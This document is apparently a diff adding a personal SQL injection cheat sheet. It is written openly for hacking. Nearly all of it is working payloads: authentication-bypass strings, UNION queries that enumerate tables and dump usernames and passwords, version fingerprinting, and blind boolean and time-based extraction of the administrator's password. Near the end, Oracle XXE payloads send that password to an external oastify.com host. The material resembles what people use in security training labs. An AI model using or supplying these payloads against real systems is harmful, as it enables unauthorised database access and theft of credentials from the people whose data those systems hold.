@@ -1,0 +1,120 @@
+# METHODS
+(_If you want to hack then scroll these are just general concepts_)
+
+""" General Concept """
+UPDATE users
+SET password = 'newpassword123'
+WHERE username = 'admin'; 
+
+SELECT username, email
+FROM users
+WHERE role = 'administrator'; 
+
+INSERT INTO users (username, password, email, role)
+VALUES ('tester', 'securepass', 'test@example.com', 'user'); 
+___________________________________________________________________________________________________________
+### Database version ###
+
+Oracle:	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft:	SELECT @@version
+PostgreSQL:	SELECT version()
+MySQL:	SELECT @@version
+___________________________________________________________________________________________________________
+### Database contents ###
+
+Oracle :	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft :	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+PostgreSQL :	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+MySQL	SELECT : * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+___________________________________________________________________________________________________________
+``Simple Injections...``
+    '
+    '--
+    '+OR+1=1-- 
+    -- or # 
+    ' OR '1
+    ' OR 1 -- -
+    " OR "" = "
+    " OR 1 = 1 -- -
+    ' OR '' = '
+    '+or'1'='1
+___________________________________________________________________________________________________________
+# REMEMBER THERE WILL BE MANY HEADCHES BEACUSE YOU NEED TO MAKE MODS FOR SUCCESS DEPENDING ON THE DATABASE #
+
+// to determine the columns available 
+' UNION SELECT NULL-- // //add additional nulls to determine the number of columns
+('+union+select+NULL,NULL,NULL--)
+' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables-- 
+' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'-- 
+' UNION SELECT 'a',NULL,NULL,NULL--// if you know the string / table name 
+' UNION+SELECT+'abc','def'+FROM+dual-- // dual is built in oracle only
+'+UNION+SELECT+'abc','def'# // if one column doesnnot validate string you need to 
+                              modify it or add null
+1' ORDER BY 2--+   OR ' ORDER BY 2-- //I Don't use it most of the time
+ '+union+all+select+'0','Qrc0Pq','1234'-- //finding column containing text
+___________________________________________________________________________________________________________            
+//Database Version Detection ( depending on the database make mods.)
+'+UNION+SELECT+@@version,+NULL# 
+'+UNION+SELECT+BANNER,+NULL+FROM+@@version-- 
+'+union+all+select+'1',banner+FROM+v$version-- //oracle
+'+union+select+0,@@version;# //MySQL and Microsoft
+'+union+all+select+username_lvfons,password_abcde+from+users_abcde--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))-- 
+___________________________________________________________________________________________________________
+//contents of the database ( add UNION, make mods, play with it)
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'Table name'
+
+' UNION SELECT table_schema, table_name, null FROM information_schema.tables-- 
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--  //oracle
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- //oracle
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+'+union+all+select+username,password+from+users--
+___________________________________________________________________________________________________________
+//if the databse returns one column
+' UNION SELECT username, password FROM users-- 
+{' UNION SELECT NULL,username FROM users--}
+' UNION SELECT username || '~' || password FROM users--  //oracle db
+1 UNION SELECT username || '~' || password FROM users // not breaking string
+'+union+all+select+NULL,CONCAT(username,':',password)+from+users //retrieving multiple values in a single column
+
+1' ORDER BY 2--+
+1 UNION SELECT 1 INTO @,@
+1 AND (SELECT * FROM Users) = 1	
+')+union+select+1,sleep(10)--+-
+___________________________________________________________________________________________________________
+"""   BLIND SQL INJECTIONS   """
+c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
+c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a ...
+
+//determining which column exist, if it throws error then try 'a' --
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' -- 
+
+'||pg_sleep(10)-- //time delays
+'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)-- // time & info
+'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; // out of band interaction
+'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual-- 
+___________________________________________________________________________________________________________  
+//determing word count                                         
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a                                       
+' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1) = 'administrator' -- 
+___________________________________________________________________________________________________________
+//determing password
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'admin'),1,1) = 'a' --
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'admin'),2,1) > 'm' --
+___________________________________________________________________________________________________________
